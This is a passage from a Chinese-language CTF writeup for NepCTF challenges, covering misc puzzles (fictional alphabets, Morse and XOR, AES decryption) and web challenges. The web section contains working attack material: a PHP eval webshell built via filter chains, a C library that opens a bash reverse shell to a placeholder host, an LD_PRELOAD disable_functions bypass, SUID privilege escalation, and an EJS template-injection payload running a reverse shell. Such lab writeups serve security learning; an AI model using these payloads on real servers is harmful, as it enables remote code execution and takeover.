src="https://img2023.cnblogs.com/blog/3051266/202406/3051266-20240607191202791-843148984.png" alt="image-20240607191159956"></p><p>给了hint：<code>Atsuko Kagari</code></p><p>发现了这是一个动漫：小魔女学园</p><p>了解到这是新月文字和古龙语（我看像鸡脚语）</p><p>百度贴吧找到对照：</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202406/3051266-20240607191209889-1271665289.png" alt="image-20240607191207420"></p><p><code>HEARTISYOURMAGIC</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202406/3051266-20240607191223978-911331837.png" alt="image-20240607191221615"></p><p><code>NEPNEPABELIEVING</code></p><p>拼起来</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NepCTF&#123;NEPNEP_A_BELIEVING_HEART_IS_YOUR_MAGIC&#125;</span><br></pre></td></tr></table></figure><h2 id="小叮弹钢琴"><a href="#小叮弹钢琴" class="headerlink" title="小叮弹钢琴"></a>小叮弹钢琴</h2><p>下载后发现是一段音频，用Audacity打开</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202406/3051266-20240607191242189-641817492.png" alt="image-20240607191239458"></p><p>发现不是长就是短的，猜测是摩斯密码，一个个对，发现真是，得到提示</p><p><code>you should use this to xor something</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202406/3051266-20240607191249141-1826519038.png" alt="image-20240607191246544"></p><p>发现了一段字符串</p><p><code>0x370a05303c290e045005031c2b1858473a5f052117032c39230f005d1e17</code></p><p>看提示应该是要寻找另一串字符串，尝试与题目给的字符串异或</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202406/3051266-20240607191302916-1511626233.png" alt="image-20240607191300598"></p><h2 id="你也喜欢三月七么"><a href="#你也喜欢三月七么" class="headerlink" title="你也喜欢三月七么"></a>你也喜欢三月七么</h2><blockquote><p>三月七：耶，终于来到Nepnep星球啦，让我看看正在火热进行的Hacker夺旗大赛群聊。啊！开拓者，这群名看起来怪怪的诶。 （伸出脑袋，凑近群名，轻轻的闻了一下）哇，好咸诶，开拓者你快来看看！</p><p>开拓者（U_id）：(端着下巴，磨蹭了一下，眼神若有所思）这好像需要经过啥256处理一下才能得到我们需要的关键。</p><p>三月七：那我们快想想怎么解开这个谜题！</p><p>flag格式:NepCTF{+m+}</p><p>hint:URL为压缩包密码</p></blockquote><p><strong>txt文件：</strong></p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">salt_lenth= 10 </span><br><span class="line">key_lenth= 16 </span><br><span class="line">iv= 88219bdee9c396eca3c637c0ea436058 #原始iv转hex的值</span><br><span class="line">ciphertext= b700ae6d0cc979a4401f3dd440bf9703b292b57b6a16b79ade01af58025707fbc29941105d7f50f2657cf7eac735a800ecccdfd42bf6c6ce3b00c8734bf500c819e99e074f481dbece626ccc2f6e0562a81fe84e5dd9750f5a0bb7c20460577547d3255ba636402d6db8777e0c5a429d07a821bf7f9e0186e591dfcfb3bfedfc</span><br></pre></td></tr></table></figure><p>题目描述：群名很咸，<code>salt</code>（长度为10），因为加了NepCTF的QQ群，发现群名<code>NepCTF2023</code>正好长度为十，推测<code>salt：NepCTF2023</code></p><p>经过啥256处理一下才能得到我们需要的关键：推出sha256后得到key(关键)</p><p>猜测我们对<code>NepCTF2023</code>经过sha256后可以得到<code>key</code> ，取出前32位：</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dd8e671df3882c5be6423cd030bd7cb6</span><br></pre></td></tr></table></figure><p>然后AES解密=&gt;hex解密=&gt;base64解密：</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202406/3051266-20240607191320995-2136655502.png" alt="image-20240607191318564"></p><p><a href="https://img1.imgtp.com/2023/07/24/yOkXWSJT.png">https://img1.imgtp.com/2023/07/24/yOkXWSJT.png</a></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202406/3051266-20240607191335428-165194366.png" alt="image-20240607191333168"></p><p><strong>星穹铁道文字：</strong></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202406/3051266-20240607191342624-545869757.png" alt="image-20240607191340302"></p><p><strong>翻译一下：</strong></p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NepCTF&#123;HRP_always_likes_March_7th&#125;</span><br></pre></td></tr></table></figure><h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="Ezjava-Chekin"><a href="#Ezjava-Chekin" class="headerlink" title="Ezjava_Chekin"></a>Ezjava_Chekin</h2><p><a href="https://blog.csdn.net/dreamthe/article/details/124390531?ops_request_misc=&amp;request_id=&amp;biz_id=102&amp;utm_term=shiro_attack-4.7.0-SNAPSHOT-al&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-0-124390531.142^v92^koosearch_v1&amp;spm=1018.2226.3001.4187">详细shiro漏洞复现及利用方法（CVE-2016-4437）</a></p><p>直接利用shiro反序列化工具一把梭</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202406/3051266-20240607191401318-584320209.png" alt="image-20240607191359010"></p><p>注入内存马（换jsp类型）</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202406/3051266-20240607191411410-747375604.png" alt="image-20240607191409148"></p><p>连接成功</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202406/3051266-20240607191416770-1165957202.png" alt="image-20240607191414424"></p><p>查看start.sh</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202406/3051266-20240607191422311-1273897623.png" alt="image-20240607191420079"></p><h2 id="Ez-include"><a href="#Ez-include" class="headerlink" title="Ez_include"></a>Ez_include</h2><p>进入页面，有如下界面</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202406/3051266-20240607191442495-1317549732.png" alt="image-20240607191440315"></p><p>将<code>?</code>后面的内容删去后方访问：</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202406/3051266-20240607191450697-526892477.png" alt="image-20240607191448460"></p><p>提示让我们访问<code>/jump.php?hint</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202406/3051266-20240607191457513-892001261.png" alt="image-20240607191455085"></p><p>发现这是一个文件包含，且加后缀<code>.txt</code>，在注释里提示可以访问<code>hint.ini</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202406/3051266-20240607191503283-697759397.png" alt="image-20240607191501073"></p><p>发现远程文件包含利用不了，提示里有一篇文章：<a href="https://tttang.com/archive/1395/">https://tttang.com/archive/1395/</a></p><p>可以在github上找到利用脚本：<a href="https://github.com/synacktiv/php_filter_chain_generator">https://github.com/synacktiv/php_filter_chain_generator</a></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 php_filter_chain_generator.py --chain <span class="string">&quot;&lt;?php eval(<span class="variable">$_POST</span>[1]);?&gt;&quot;</span></span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202406/3051266-20240607191514739-1208798047.png" alt="image-20240607191512382"></p><p>这样就成功了</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202406/3051266-20240607191518322-1944982368.png" alt="image-20240607191515814"></p><p>但是查看一下<code>disable_functions、disable_classes</code> 把很多的函数和类给禁用了,还限制了<code>open_basedir=/var/www/html:/tmp</code></p><p>所以我们需要想办法 <code>php disable_function bypass</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202406/3051266-20240607191538245-1265049974.png" alt="image-20240607191536009"></p><p><strong>劫持LD_PRELOAD绕过disable_functions</strong></p><blockquote><p>LD_PRELOAD指定的动态链接库文件，会在其它文件调用之前先被调用</p><p>劫持步骤：</p><ol><li>生成一个我们的恶意动态链接库文件</li><li>利用putenv设置LD_PRELOAD为我们的恶意动态链接库文件的路径</li><li>配合php的某个函数去触发我们的恶意动态链接库文件</li><li>Getshell</li></ol></blockquote><p>这个php的函数很关键。可以使用<code>mail、error_log</code>等，但是这里被禁用了</p><p>我们还可以使用<code>mb_send_mail()</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202406/3051266-20240607191545005-427713125.png" alt="image-20240607191542830"></p><p>它是<code>mail()</code>的包装函数，因此也可以进行劫持</p><p>我们需要先编写一个恶意poc.c文件：(用来反弹shell)</p><blockquote><p><strong>attribute</strong>语法格式为：<strong>attribute</strong> ( ( attribute-list ) )<br>若函数被设定为constructor属性，则该函数会在main（）函数执行之前被自动的执行。类似的，若函数被设定为destructor属性，<br>则该函数会在main（）函数执行之后或者exit（）被调用后被自动的执行。例如下面的程序：</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line">__attribute__ ((__constructor__)) <span class="type">void</span> <span class="title function_">angel</span> <span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">    unsetenv(<span class="string">&quot;LD_PRELOAD&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/vpsip/port 0&gt;&amp;1&#x27;&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后编译一下生成恶意动态链接程序<code>poc.so</code>：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc -c -fPIC poc.c -o poc</span><br><span class="line">gcc --share poc -o poc.so</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202406/3051266-20240607191554006-1255129554.png" alt="image-20240607191551703"></p><p>然后需要把这个文件给上传到服务器上去，并且使用<code>putenv()</code>函数重新设置<code>LD_PRELOAD</code>环境变量，最后使用<code>mb_send_mail()</code>调用恶意的函数进行反弹shell</p><p>但是这里有个问题，我们没权限上传文件和写文件，相关函数被禁用了。</p><p>这里有一种方法是上传临时文件<code>/tmp/phpxxx</code>，然后使用<code>scandir(&quot;glob:///tmp/php*&quot;)</code>去模糊匹配的</p><p>在本地写一个上传文件的<code>html</code>：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>POST文件上传<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;url&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;file&quot;</span>&gt;</span>文件名：<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span>  <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span>  <span class="attr">id</span>=<span class="string">&quot;file&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    &lt;<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;提交&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>将恶意的<code>.so</code>文件上传并抓包，将数据包下面内容进行更改：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;1&quot;</span></span><br><span class="line"></span><br><span class="line">var_dump(scandir(<span class="string">&#x27;/tmp&#x27;</span>));<span class="variable">$a</span>=scandir(<span class="string">&quot;glob:///tmp/php*&quot;</span>);<span class="variable">$filename</span>=<span class="string">&quot;/tmp/&quot;</span>.<span class="variable">$a</span>[0];var_dump(<span class="variable">$filename</span>);putenv(<span class="string">&quot;LD_PRELOAD=<span class="variable">$filename</span>&quot;</span>);mb_send_mail(<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>);</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202406/3051266-20240607191603773-362245868.png" alt="image-20240607191601339"></p><p>发送后，可以看到，反弹shell成功了</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202406/3051266-20240607191617064-2120297057.png" alt="image-20240607191614906"></p><p>利用的是php产生的临时文件，而这个临时文件的文件名是<strong>随机</strong>的，因此用<strong>glob伪协议</strong>去锁定。然后劫持</p><p>触发LD_PRELOAD的函数，常见的2个<code>mail、error_log</code>都可以触发系统函数<code>send_mail</code>进而触发LD劫持，但是这里ban了这2个函数，因此还有个替代品<code>mb_send_mail</code>最后RCE</p><p>在根目录下查看到flag</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202406/3051266-20240607191630804-1894573378.png" alt="image-20240607191628575"></p><p>但是发现没有权限：</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202406/3051266-20240607191637136-1283389099.png" alt="image-20240607191634986"></p><p>用环境变量提权。因为我们有一个suid的二进制文件<code>showmsg</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202406/3051266-20240607191644575-741172198.png" alt="image-20240607191642261">提权成功，然后给777权限给flag，直接读就好了</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202406/3051266-20240607191654692-265270369.png" alt="image-20240607191652430"></p><h2 id="Post-Crad-For-You"><a href="#Post-Crad-For-You" class="headerlink" title="Post Crad For You"></a>Post Crad For You</h2><p>先拿到题目代码</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> path = <span class="built_in">require</span>(<span class="string">&#x27;path&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> crypto = <span class="built_in">require</span>(<span class="string">&quot;crypto&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>()</span><br><span class="line"><span class="keyword">const</span> port = <span class="number">3000</span></span><br><span class="line"></span><br><span class="line">templateDir = path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;template&#x27;</span>);</span><br><span class="line">app.<span class="title function_">set</span>(<span class="string">&#x27;view engine&#x27;</span>, <span class="string">&#x27;ejs&#x27;</span>);</span><br><span class="line">app.<span class="title function_">set</span>(<span class="string">&#x27;template&#x27;</span>, templateDir);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">sleep</span>(<span class="params">milliSeconds</span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="title class_">StartTime</span> =<span class="keyword">new</span> <span class="title class_">Date</span>().<span class="title function_">getTime</span>();</span><br><span class="line">    <span class="keyword">let</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (<span class="keyword">new</span> <span class="title class_">Date</span>().<span class="title function_">getTime</span>() &lt;<span class="title class_">StartTime</span>+milliSeconds);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">function</span>(<span class="params">req, res</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">sendFile</span>(<span class="string">&#x27;./index.html&#x27;</span>, &#123;<span class="attr">root</span>: __dirname&#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/create&#x27;</span>, <span class="keyword">function</span>(<span class="params">req, res</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> uuid;</span><br><span class="line">    <span class="keyword">let</span> name = req.<span class="property">query</span>.<span class="property">name</span> ?? <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">let</span> address = req.<span class="property">query</span>.<span class="property">address</span> ?? <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">let</span> message = req.<span class="property">query</span>.<span class="property">message</span> ?? <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">        uuid = crypto.<span class="title function_">randomUUID</span>();</span><br><span class="line">    &#125; <span class="keyword">while</span> (fs.<span class="title function_">existsSync</span>(<span class="string">`<span class="subst">$&#123;templateDir&#125;</span>/<span class="subst">$&#123;uuid&#125;</span>.ejs`</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (name != <span class="string">&#x27;&#x27;</span> &amp;&amp; address != <span class="string">&#x27;&#x27;</span> &amp;&amp; message != <span class="string">&#x27;&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">let</span> source = [<span class="string">&quot;source&quot;</span>, <span class="string">&quot;source1&quot;</span>, <span class="string">&quot;source2&quot;</span>, <span class="string">&quot;source3&quot;</span>].<span class="title function_">sort</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0.5</span> - <span class="title class_">Math</span>.<span class="title function_">random</span>();</span><br><span class="line">            &#125;)</span><br><span class="line">            fs.<span class="title function_">readFile</span>(source[<span class="number">0</span>]+<span class="string">&quot;.html&quot;</span>, <span class="string">&#x27;utf8&#x27;</span>,<span class="keyword">function</span>(<span class="params">err, pageContent</span>)&#123;</span><br><span class="line">                fs.<span class="title function_">writeFileSync</span>(<span class="string">`<span class="subst">$&#123;templateDir&#125;</span>/<span class="subst">$&#123;uuid&#125;</span>.ejs`</span>, pageContent.<span class="title function_">replace</span>(<span class="regexp">/--ID--/g</span>, uuid.<span class="title function_">replace</span>(<span class="regexp">/-/g</span>, <span class="string">&quot;&quot;</span>)));</span><br><span class="line">                <span class="title function_">sleep</span>(<span class="number">2000</span>);</span><br><span class="line">            &#125;)</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            res.<span class="title function_">status</span>(<span class="number">500</span>).<span class="title function_">send</span>(<span class="string">&quot;Params `name` or `address` or `message` empty&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span>(err) &#123;</span><br><span class="line">        res.<span class="title function_">status</span>(<span class="number">500</span>).<span class="title function_">send</span>(<span class="string">&quot;Failed to write file&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">redirect</span>(<span class="string">`/page?pageid=<span class="subst">$&#123;uuid&#125;</span>&amp;name=<span class="subst">$&#123;name&#125;</span>&amp;address=<span class="subst">$&#123;address&#125;</span>&amp;message=<span class="subst">$&#123;message&#125;</span>`</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/page&#x27;</span>, <span class="function">(<span class="params">req,res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> id = req.<span class="property">query</span>.<span class="property">pageid</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="regexp">/^[0-9A-F]&#123;8&#125;-[0-9A-F]&#123;4&#125;-[4][0-9A-F]&#123;3&#125;-[89AB][0-9A-F]&#123;3&#125;-[0-9A-F]&#123;12&#125;$/i</span>.<span class="title function_">test</span>(id) || !fs.<span class="title function_">existsSync</span>(<span class="string">`<span class="subst">$&#123;templateDir&#125;</span>/<span class="subst">$&#123;id&#125;</span>.ejs`</span>)) &#123;</span><br><span class="line">        res.<span class="title function_">status</span>(<span class="number">404</span>).<span class="title function_">send</span>(<span class="string">&quot;Sorry, no such id&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    res.<span class="title function_">render</span>(<span class="string">`<span class="subst">$&#123;templateDir&#125;</span>/<span class="subst">$&#123;id&#125;</span>.ejs`</span>, req.<span class="property">query</span>);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(port, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`App listening on port <span class="subst">$&#123;port&#125;</span>`</span>)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>发现<code>res.render(`$&#123;templateDir&#125;/$&#123;id&#125;.ejs`, req.query);</code>这段有模板注入的，他把query放进去render了。</p><p>网上是有关于这个的CVE：<a href="https://inhann.top/2023/03/26/ejs/">CVE-2022-29078</a></p><p><strong>payload：</strong></p><p>在url后加入：</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;settings[view options][escapeFunction]=console.log;this.global.process.mainModule.require(&#x27;child_process&#x27;).execSync(&quot;bash%20-c%20&#x27;bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2Fip%2Fport%20%3C%261&#x27;&quot;);&amp;settings[view options][client]=true</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202406/3051266-20240607191716473-2064343561.png" alt="image-20240607191713978"></p><p>反弹shell成功！</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202406/3051266-20240607191726007-1545553940.png" alt="image-20240607191723486"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202406/3051266-20240607191731934-1706873529.png" alt="image-20240607191729610"></p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Competition </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
